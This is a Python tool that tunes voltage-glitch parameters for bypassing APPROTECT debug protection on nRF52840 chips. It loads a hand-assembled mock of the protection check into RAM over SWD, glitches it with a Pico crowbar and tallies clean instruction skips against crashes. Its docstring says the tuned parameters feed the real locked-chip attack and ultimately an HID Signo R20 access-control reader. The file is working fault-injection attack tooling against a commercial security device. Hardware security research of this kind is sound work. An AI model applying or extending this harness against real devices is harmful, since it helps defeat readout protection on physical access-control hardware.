#!/usr/bin/env python3
"""
nrf_feedback_harness.py  --  "Build A": closed-loop, scope-free glitch feedback
for the nRF52840 APPROTECT bypass campaign.

WHY THIS EXISTS
---------------
Blind boot-sweeping of the real locked part is exhausted: the firmware's only
feedback during boot is `disrupts` (a post-settle DPIDR read), and DPIDR's debug
domain survives any boot fault, so it reports 0 regardless. We are blind to what
the glitch actually does to the core, so we cannot tell a *clean instruction skip*
(what an APPROTECT bypass needs) from a *PC-jump crash* (useless, just reboots and
re-locks).

This harness removes the blindfold. On the *transiently unlocked* chip (after
CTRL-AP ERASEALL opens the AHB-AP) it loads a tiny RAM routine that MIMICS the
APPROTECT check, runs it in a free loop, fires glitches at it, and reads ground-
truth result counters back over SWD. That gives a direct 3-way classifier per shot:

    SKIP      unlock_count advanced  -> the conditional was skipped/flipped:
                                        a CLEAN instruction-skip == the win
    CRASH     heartbeat frozen       -> core hung/reset (PC-jump fault) == useless
    NOEFFECT  only locked_count moved -> glitch missed / too weak

Sweeping crowbar WIDTH while tallying SKIP vs CRASH finds the amplitude/width band
that produces clean skips instead of crashes. Those tuned params (plus the
separately-measured boot read-timing) then feed the real locked-boot APPROTECT
sweep -- and ultimately the HID Signo R20.

THE MOCK ROUTINE (hand-assembled Thumb, base 0x20000000, r0 = counter base)
--------------------------------------------------------------------------
    loop:
        ldr  r3,[r0,#8] ; adds r3,#1 ; str r3,[r0,#8]   ; heartbeat++ (alive proof)
        movs r1,#1                                       ; <-- SKIP TARGET ("locked"=1)
        cmp  r1,#1
        bne  unlocked                                    ; taken only if r1!=1
        ldr  r3,[r0,#0] ; adds r3,#1 ; str r3,[r0,#0]    ; locked_count++
        movs r1,#0                                       ; clear so next skip is detectable
        b    loop
    unlocked:
        ldr  r3,[r0,#4] ; adds r3,#1 ; str r3,[r0,#4]    ; unlock_count++
        b    loop

Skipping the single `movs r1,#1` leaves r1==0 (cleared at end of the locked path),
so cmp/bne falls through to `unlocked` and unlock_count ticks: a textbook single-
instruction-skip detector that maps 1:1 onto the real "skip the lock decision" fault.

WIRING / ENV: Crowbar GP2 -> DEC1, target power
on GP10, SWD on GP17/GP18. NO SCOPE NEEDED -- feedback is pure SWD. Keep the 10 ohm
crowbar source resistor (the fault-no-reset regime). 6.67 ns per width cycle.

NOTE: unlike a real boot, the mock chip is already erased and running our RAM loop,
so there is no NVMC/boot-ROM mass-erase path to trip -- width can be explored past
the 450-cycle boot clamp safely here to map the full fault response.

Examples:
    ./nrf_feedback_harness.py run                       # load + verify the live mock
    ./nrf_feedback_harness.py trial --width 350 --reps 50
    ./nrf_feedback_harness.py sweep --w-start 50 --w-end 600 --w-step 25 --reps 40
"""

import argparse
from colors import ColorHelpFormatter
import glob
import sys
import time

import serial  # pyserial

from nrf_recovery import project_path

# The Pico re-enumerates (and can hop ACM0<->ACM1) whenever it is reset or jostled,
# so don't hard-code the node: None => auto-detect by probing for the VERSION banner.
PICO_PORT_DEFAULT = None


def find_pico_port():
    """Probe /dev/ttyACM* for the Raiden VERSION banner; return the first match."""
    for port in sorted(glob.glob("/dev/ttyACM*")):
        try:
            s = serial.Serial(port, 115200, timeout=1.0)
            time.sleep(0.3)
            s.reset_input_buffer()
            s.write(b"VERSION\r\n")
            time.sleep(0.3)
            r = b""
            while s.in_waiting:
                r += s.read(s.in_waiting); time.sleep(0.02)
            s.close()
            if b"Raiden" in r:
                return port
        except serial.SerialException:
            pass
    return None

CODE_BASE    = 0x20000000
COUNTER_BASE = 0x20002000      # locked_count, unlock_count, heartbeat (3 words)
STACK_TOP    = 0x20008000
XPSR_THUMB   = 0x01000000

# Hand-assembled Thumb, little-endian word-packed (verified against on-chip readback).
CODE_WORDS = [
    0x33016883,  # 0x00: ldr r3,[r0,#8] ; adds r3,#1
    0x21016083,  # 0x04: str r3,[r0,#8] ; movs r1,#1   <- skip target
    0xD1042901,  # 0x08: cmp r1,#1      ; bne unlocked
    0x33016803,  # 0x0C: ldr r3,[r0,#0] ; adds r3,#1
    0x21006003,  # 0x10: str r3,[r0,#0] ; movs r1,#0
    0x6843E7F4,  # 0x14: b loop         ; ldr r3,[r0,#4]   (unlocked:)
    0x60433301,  # 0x18: adds r3,#1     ; str r3,[r0,#4]
    0xBF00E7F0,  # 0x1C: b loop         ; nop (pad)
]


class Pico:
    def __init__(self, port, baud=115200):
        self.s = serial.Serial(port, baud, timeout=1.5)
        time.sleep(0.3)
        self.s.reset_input_buffer()

    def cmd(self, c, wait=0.25):
        # Drain only what has actually arrived: a blind s.read(N) would block the
        # full serial timeout every call (N bytes never come), making each shot
        # cost seconds. reset before write so a read can't pick up stale output.
        self.s.reset_input_buffer()
        self.s.write(c.encode() + b"\r\n")
        time.sleep(wait)
        out = b""
        while self.s.in_waiting:
            out += self.s.read(self.s.in_waiting)
            time.sleep(0.01)
        return out.decode("utf-8", "replace")

    def close(self):
        try:
            self.cmd("ARM OFF", 0.05)   # never leave the glitch engine armed
        except Exception:
            pass
        try:
            self.s.close()
        except Exception:
            pass


def parse_words(text, n):
    """Parse 'SWD READ' hex-dump output into a list of little-endian u32 words."""
    data = bytearray()
    for line in text.splitlines():
        if ":" not in line:
            continue
        left, _, right = line.partition(":")
        left = left.strip()
        if len(left) != 10 or not left.startswith("0x"):
            continue
        try:
            int(left, 16)
        except ValueError:
            continue
        # take only the 2-hex-digit byte tokens, stop at the ASCII gutter
        for tok in right.split():
            if len(tok) == 2:
                try:
                    data.append(int(tok, 16))
                except ValueError:
                    break
            else:
                break
    words = []
    for i in range(0, min(len(data), n * 4), 4):
        words.append(int.from_bytes(data[i:i + 4], "little"))
    return words


def read_counters(p):
    """Return (locked, unlock, heartbeat) or None on read fault."""
    w = parse_words(p.cmd(f"SWD READ 0x{COUNTER_BASE:08X} 3", 0.12), 3)
    return tuple(w) if len(w) == 3 else None


def is_unlocked_now(p):
    """True if the AHB-AP is usable: code readback at CODE_BASE matches CODE_WORDS[0]."""
    w = parse_words(p.cmd(f"SWD READ 0x{CODE_BASE:08X} 1", 0.3), 1)
    return len(w) == 1 and w[0] == CODE_WORDS[0]


def load_mock(p, do_erase):
    """Load the mock routine into RAM and start it running. Returns True if alive."""
    p.cmd("TARGET NRF52840", 0.4)
    if do_erase:
        # Clear any wedged state from a prior crash/abort: disarm the glitch engine
        # and power-cycle the target before re-establishing the transient unlock.
        # A glitch left ARMED or SWD pins left driven can otherwise block ERASEALL.
        p.cmd("ARM OFF", 0.1)
        p.cmd("TARGET POWER OFF", 0.3)
        p.cmd("TARGET POWER ON", 0.3)
        time.sleep(0.2)
        p.cmd("TARGET NRF ERASE", 1.2)        # transient AHB unlock
    if "OK" not in p.cmd("SWD HALT", 0.4):
        return False
    for i, v in enumerate(CODE_WORDS):
        p.cmd(f"SWD WRITE 0x{CODE_BASE + i * 4:08X} 0x{v:08X}", 0.18)
    for off in (0, 4, 8):
        p.cmd(f"SWD WRITE 0x{COUNTER_BASE + off:08X} 0x00000000", 0.15)
    if not is_unlocked_now(p):
        return False
    p.cmd(f"SWD SETREG r0 0x{COUNTER_BASE:08X}", 0.15)
    p.cmd(f"SWD SETREG sp 0x{STACK_TOP:08X}", 0.15)
    p.cmd(f"SWD SETREG xpsr 0x{XPSR_THUMB:08X}", 0.15)
    p.cmd(f"SWD SETREG pc 0x{CODE_BASE:08X}", 0.15)
    p.cmd("SWD RESUME", 0.25)
    return heartbeat_alive(p)


def heartbeat_alive(p):
    """Confirm the loop is running: heartbeat must advance between two reads."""
    a = read_counters(p)
    time.sleep(0.15)
    b = read_counters(p)
    return a is not None and b is not None and b[2] != a[2]


def ensure_running(p, tries=3):
    """Make sure the mock loop is live. Reuse intact RAM if possible, else re-erase."""
    for attempt in range(tries):
        if heartbeat_alive(p):
            return True
        # not running: is the AHB still open with our code intact?
        if is_unlocked_now(p):           # RAM code survived; just restart it
            if load_mock(p, do_erase=False):
                return True
        if load_mock(p, do_erase=True):  # full re-erase + reload
            return True
        time.sleep(0.2)
    return False


def one_shot(p, width, settle_s=0.006):
    """Fire one armed glitch at the running loop and classify the result.

    Returns ('SKIP'|'CRASH'|'NOEFFECT'|'READERR', d_locked, d_unlock).
    """
    base = read_counters(p)
    if base is None:
        return ("READERR", 0, 0)
    p.cmd(f"SET WIDTH {width}", 0.05)
    p.cmd("TRIGGER NONE", 0.05)
    p.cmd("ARM ON", 0.05)
    p.cmd("GLITCH", 0.05)                # fires immediately (TRIGGER NONE), auto-disarms
    time.sleep(settle_s)
    post = read_counters(p)
    if post is None:
        return ("CRASH", 0, 0)           # lost SWD/AHB == reset/lock
    d_lk = (post[0] - base[0]) & 0xFFFFFFFF
    d_un = (post[1] - base[1]) & 0xFFFFFFFF
    if post[2] == base[2]:               # heartbeat frozen
        return ("CRASH", d_lk, d_un)
    if d_un > 0:
        return ("SKIP", d_lk, d_un)
    return ("NOEFFECT", d_lk, d_un)


# --------------------------------------------------------------------------- #
# Subcommands
# --------------------------------------------------------------------------- #
def cmd_run(a):
    p = Pico(a.pico_port)
    try:
        if not ensure_running(p):
            print("FAIL: could not start the mock loop (check SWD wiring/power).")
            return
        c0 = read_counters(p)
        time.sleep(0.3)
        c1 = read_counters(p)
        print("Mock loop LIVE.")
        print(f"  locked_count : {c0[0]:#010x} -> {c1[0]:#010x}")
        print(f"  unlock_count : {c0[1]:#010x} -> {c1[1]:#010x}   (must stay 0 with no glitch)")
        print(f"  heartbeat    : {c0[2]:#010x} -> {c1[2]:#010x}")
        rate = (c1[2] - c0[2]) & 0xFFFFFFFF
        print(f"  ~{rate/0.3/1e6:.1f} M iterations/s")
    finally:
        p.close()


def cmd_trial(a):
    p = Pico(a.pico_port)
    try:
        if not ensure_running(p):
            print("FAIL: could not start the mock loop.")
            return
        tally = {"SKIP": 0, "CRASH": 0, "NOEFFECT": 0, "READERR": 0}
        skips = []
        for i in range(a.reps):
            r, d_lk, d_un = one_shot(p, a.width)
            tally[r] += 1
            if r == "SKIP":
                skips.append(d_un)
            if r in ("CRASH", "READERR"):
                ensure_running(p)
        n = a.reps
        print(f"width={a.width} cyc (~{a.width*20/3:.0f} ns)  reps={n}")
        print(f"  SKIP     {tally['SKIP']:4d}  ({100*tally['SKIP']/n:.1f}%)"
              + (f"   unlock deltas={skips}" if skips else ""))
        print(f"  CRASH    {tally['CRASH']:4d}  ({100*tally['CRASH']/n:.1f}%)")
        print(f"  NOEFFECT {tally['NOEFFECT']:4d}  ({100*tally['NOEFFECT']/n:.1f}%)")
        if tally["READERR"]:
            print(f"  READERR  {tally['READERR']:4d}")
    finally:
        p.close()


def cmd_sweep(a):
    p = Pico(a.pico_port)
    rows = []
    try:
        if not ensure_running(p):
            print("FAIL: could not start the mock loop.")
            return
        out = open(a.csv, "w") if a.csv else None
        hdr = "width_cyc,width_ns,reps,skip,crash,noeffect,skip_pct,crash_pct"
        print(f"# width sweep {a.w_start}..{a.w_end} step {a.w_step}, reps {a.reps}")
        print(hdr)
        if out:
            out.write(hdr + "\n")
        w = a.w_start
        while w <= a.w_end:
            t = {"SKIP": 0, "CRASH": 0, "NOEFFECT": 0, "READERR": 0}
            for _ in range(a.reps):
                r, _dl, _du = one_shot(p, w)
                t[r] += 1
                if r in ("CRASH", "READERR"):
                    ensure_running(p)
            n = a.reps
            sp, cp = 100 * t["SKIP"] / n, 100 * t["CRASH"] / n
            line = (f"{w},{w*20//3},{n},{t['SKIP']},{t['CRASH']},"
                    f"{t['NOEFFECT']},{sp:.1f},{cp:.1f}")
            print(line)
            if out:
                out.write(line + "\n"); out.flush()
            rows.append((w, t["SKIP"], t["CRASH"], sp, cp))
            w += a.w_step
        if out:
            out.close()
        # recommend: highest clean-skip rate among widths with tolerable crash rate
        viable = [r for r in rows if r[3] > 0 and r[4] <= a.max_crash_pct]
        if viable:
            best = max(viable, key=lambda r: r[3])
            print(f"\nBEST clean-skip width = {best[0]} cyc (~{best[0]*20//3} ns): "
                  f"SKIP {best[3]:.1f}%, CRASH {best[4]:.1f}%  "
                  f"(<= {a.max_crash_pct:.0f}% crash). Use this for the real APPROTECT sweep.")
        else:
            any_skip = [r for r in rows if r[3] > 0]
            if any_skip:
                best = max(any_skip, key=lambda r: r[3])
                print(f"\nNo width met the {a.max_crash_pct:.0f}% crash budget. "
                      f"Highest skip width = {best[0]} cyc: SKIP {best[3]:.1f}%, CRASH {best[4]:.1f}%. "
                      f"Lower amplitude (raise crowbar source R) to trade crashes for clean skips.")
            else:
                print("\nNo clean skips at any width. Glitch too weak (no fault) or "
                      "too strong (all crashes): adjust crowbar source resistance, "
                      "then re-sweep. See nrf_feedback_harness --help.")
    finally:
        p.close()


def main():
    p = argparse.ArgumentParser(
        description=__doc__, formatter_class=ColorHelpFormatter)
    p.add_argument("--pico-port", default=PICO_PORT_DEFAULT,
                   help="Pico CDC port (default: auto-detect)")
    sub = p.add_subparsers(dest="cmd", required=True)

    sub.add_parser("run", help="load + verify the live mock loop").set_defaults(func=cmd_run)

    sp = sub.add_parser("trial", help="fire N glitches at one width, classify")
    sp.add_argument("--width", type=int, default=350, help="crowbar width, 6.67ns cycles")
    sp.add_argument("--reps", type=int, default=50, help="number of glitch shots")
    sp.set_defaults(func=cmd_trial)

    sp = sub.add_parser("sweep", help="sweep width; tally SKIP/CRASH per width")
    sp.add_argument("--w-start", dest="w_start", type=int, default=50, help="width sweep start, cyc")
    sp.add_argument("--w-end", dest="w_end", type=int, default=600, help="width sweep end, cyc")
    sp.add_argument("--w-step", dest="w_step", type=int, default=25, help="width step, cyc")
    sp.add_argument("--reps", type=int, default=40, help="shots per width")
    sp.add_argument("--max-crash-pct", dest="max_crash_pct", type=float, default=30.0,
                    help="crash-rate budget when recommending a width")
    sp.add_argument("--csv", default=project_path("nrf_feedback_sweep.csv"), help="CSV output (default: scripts/nrf52840/)")
    sp.set_defaults(func=cmd_sweep)

    a = p.parse_args()
    if a.pico_port is None:
        a.pico_port = find_pico_port()
        if a.pico_port is None:
            print("ERROR: no Raiden Pico found on /dev/ttyACM* (reset/replug it, "
                  "or pass --pico-port).")
            sys.exit(1)
        print(f"[auto] using Pico on {a.pico_port}")
    try:
        a.func(a)
    except KeyboardInterrupt:
        print("\ninterrupted")
        sys.exit(130)


if __name__ == "__main__":
    main()
